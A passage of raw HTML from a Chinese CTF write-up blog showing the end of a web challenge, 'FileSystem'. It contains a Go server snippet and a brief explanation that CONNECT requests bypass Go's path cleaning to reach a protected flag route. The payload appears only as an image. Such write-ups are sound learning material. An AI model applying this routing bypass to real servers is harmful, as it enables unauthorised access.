class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	http.HandleFunc(&quot;/&quot;, fileHandler)</span><br><span class="line">	http.HandleFunc(&quot;/there_may_be_a_flag&quot;, func(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">		w.Write([]byte(`No! You can&#x27;t see the flag!`))</span><br><span class="line">	&#125;)</span><br><span class="line">	log.Fatal(http.ListenAndServe(&quot;:8889&quot;, nil))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然没学过go，但是不妨碍读，大概意思就是开了个<code>/there_may_be_a_flag</code>路由要我们访问，但是直接访问的话会被拒绝。这里我们要用到golang的一个安全漏洞，详细参考下面的博客：<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b7523fed409f">golang 的一些安全问题</a></p>
<p>对于CONNECT请求，path和host都不会改变其内容,因此我们构建payload，获取flag：<br><img src="https://s2.loli.net/2022/02/18/OS2dGEust1c4B6e.png"></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/ctf/" rel="tag"># -ctf</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2022/02/13/XXE%E7%9A%84%E5%AD%A6%E4%B9%A0/" rel="next" title="XXE的学习">
                <i class="fa fa-chevron-left"></i> XXE的学习
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2022/02/21/buu%E7%BB%83%E4%B9%A02/" rel="prev" title="buu练习2">
                buu练习2 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives%7C%7C%20archive">
              
                  <span class="site-state-item-count">61</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">25</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number"></span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ECC"><span class="nav-number">1.</span> <span class="nav-text">ECC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PRNG"><span class="nav-number">2.</span> <span class="nav-text">PRNG</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number"></span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%86%E7%83%82"><span class="nav-number">1.</span> <span class="nav-text">摆烂</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#At0m%E7%9A%84%E7%BB%99%E4%BD%A0%E4%BB%AC%E7%9A%84-%E8%BF%9F%E5%88%B0%E7%9A%84-%E6%83%85%E4%BA%BA%E8%8A%82%E7%A4%BC%E7%89%A9%EF%BC%88%E8%B5%9B%E5%90%8E%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">At0m的给你们的(迟到的)情人节礼物（赛后）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-number"></span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezvm"><span class="nav-number">1.</span> <span class="nav-text">ezvm</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number"></span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Markdown-Online%EF%BC%88%E8%B5%9B%E5%90%8E%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Markdown Online（赛后）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Comment"><span class="nav-number">2.</span> <span class="nav-text">Comment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FileSystem"><span class="nav-number">3.</span> <span class="nav-text">FileSystem</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">liszt_lin</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
